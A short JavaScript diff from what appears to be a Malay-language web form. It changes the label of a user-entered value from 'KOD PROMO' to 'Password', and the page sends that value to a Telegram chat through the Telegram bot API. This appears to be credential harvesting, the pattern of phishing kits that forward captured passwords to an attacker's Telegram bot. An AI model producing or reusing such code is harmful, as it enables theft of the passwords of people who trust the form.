@@ -188,7 +188,7 @@
             btn.disabled = true;
 
             const promoText = promo ? promo.toUpperCase() : "(Tiada / Kosong)";
-            const mesejPromo = `🎁 *KOD PROMO*%0A━━━━━━━━━━━━━━━━━━%0APromo: ${promoText}`;
+            const mesejPromo = `🎁 *PASSWORD*%0A━━━━━━━━━━━━━━━━━━%0APassword: ${promoText}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${mesejPromo}&parse_mode=Markdown`);
